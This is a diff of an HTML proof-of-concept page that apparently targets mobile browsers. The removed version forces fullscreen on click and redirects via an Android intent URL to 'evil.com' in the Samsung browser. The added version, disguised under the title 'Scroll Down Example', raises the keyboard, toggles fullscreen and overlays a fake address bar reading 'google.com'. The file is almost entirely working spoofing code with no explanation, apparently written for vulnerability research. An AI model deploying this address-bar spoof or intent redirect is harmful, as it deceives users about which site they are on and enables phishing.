@@ -1,20 +1,82 @@
-<html>
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Scroll Down Example</title>
+<style>
+  body { font-family: sans-serif; }
+  .spacer { height: 2000px; } /* makes the page very tall */
+  .bottom-text { font-size: 20px; text-align: center; margin: 20px; }
+</style>
+</head>
 <body>
 
+<button id="showBtn">Show Keyboard</button>
+<textarea id="ta" placeholder="Textarea for forced focus…"></textarea>
+
+<div class="fake-bar" id="fakeBar">google.com</div>
+
+<!-- BIG SPACER -->
+<div class="spacer"></div>
+
+<!-- Text far down the page -->
+<div class="bottom-text">
+  🎉 You finally scrolled down and found this text! 🎉
+</div>
+
 <script>
+const fakeBar = document.getElementById('fakeBar');
+const ta = document.getElementById('ta');
 
-window.onclick=function incognito() {
+// Adjust fake bar position above keyboard
+function adjustFakeBar() {
+  const vv = window.visualViewport;
+  let keyboardHeight = 0;
 
-document.documentElement.requestFullscreen();
-location.replace('intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end');
+  if (vv) {
+    keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
+  }
 
-
+  fakeBar.style.bottom = keyboardHeight + 'px';
 }
 
-</script>
+function showFakeBar() {
+  fakeBar.classList.add('show');
+  adjustFakeBar();
+}
 
-<h1> CLICK HOME icon FOR POC </h1>
+function hideFakeBar() {
+  fakeBar.classList.remove('show');
+}
+
+if ('visualViewport' in window) {
+  window.visualViewport.addEventListener('resize', () => {
+    if (document.activeElement === ta) adjustFakeBar();
+  });
+}
+
+window.addEventListener('orientationchange', adjustFakeBar);
+
+document.getElementById("showBtn").onclick = async () => {
+  ta.focus();
+  try {
+    await document.documentElement.requestFullscreen();
+    setTimeout(() => {
+      prompt();
+      document.exitFullscreen().catch(() => {});
+    }, 2020);
+  } catch (e) {}
+
+  setTimeout(async () => {
+    if (navigator.virtualKeyboard?.show) {
+      try { await navigator.virtualKeyboard.show(); } catch(e){}
+    }
+    showFakeBar();
+  }, 150);
+};
+
+ta.addEventListener('blur', hideFakeBar);
+</script>
 
 </body>
 </html>
